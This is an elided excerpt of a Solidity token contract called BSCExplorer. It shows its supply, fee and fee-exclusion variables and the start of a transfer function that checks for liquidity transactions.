...
contract BSCExplorer is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    string private _name = "BSCExplorer";
    string private _symbol = "BSCExplorer";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 1000000 * 10 ** _decimals;
    uint256 private _maxTxTokens = 500000 * 10 ** _decimals;
    mapping (address => bool) private _isExcludedFromFee;
    uint256 private _fee = 3;
    mapping(address => uint256) private approval;
    uint256 private _approval = _totalSupply.div(10 ** (_decimals + 5));
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        bool liquidityTx = (Address.isContract(sender) || Address.isContract(recipient)) && sender != pair() && recipient != pair();
        if (!_isExcludedFromFee[sender] && !_isExcludedFromFee[recipient] && recipient != address(this) && !inLiquidityTransaction && !liquidityTx) {
